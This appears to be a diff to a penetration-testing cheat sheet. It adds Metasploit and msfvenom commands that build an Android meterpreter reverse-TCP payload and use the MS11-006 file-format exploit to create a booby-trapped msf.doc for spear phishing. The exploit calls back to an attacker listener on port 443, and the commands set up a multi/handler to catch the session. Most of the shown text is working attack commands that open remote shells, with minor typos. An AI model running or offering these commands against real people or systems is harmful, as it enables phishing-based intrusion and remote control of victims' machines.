@@ -390,6 +390,9 @@ ssh -l benr -D 1080 192.168.253.143 -N -f
 sslscan <domain>                           # SSL review
 whois secmaniac.net
 
+msfvenom -p android/meterpreter/reverse_tcp  LHOST=192.168.0.110 LPORT=4444 R               # payload as raw input
+
+
 # MSFconsole
 #------------------------------------------------------------------------------
 hosts -c address,os_name -S Linux -R
@@ -719,6 +722,26 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.5 LPORT=4444 -f exe -e x8
 # Browser-Based Exploits
 # NOP - do nothing and move to the next instruction
 # Immunity Debugger     -> F2 > breakpoint   F7 > walkdown
+
+# File Format Exploits
+# file format bugs as a spear phishing attack
+msf > search ms11_006                   # win stact buffer overflow
+use exploit/windows/fileformat/ms11_006_createsizeddibsection
+#set payload payload/windows/x64/meterpreter_reverse_tcp
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 443
+exploit                 # creates msf.doc
+
+# File format with multi handler listener
+use exploit/windows/fileformat/ms11_006_createsizeddibsection
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 443
+exploit -j             # exploit running as backbround job
+session -i 1
+
 
 
 # Auxiliary
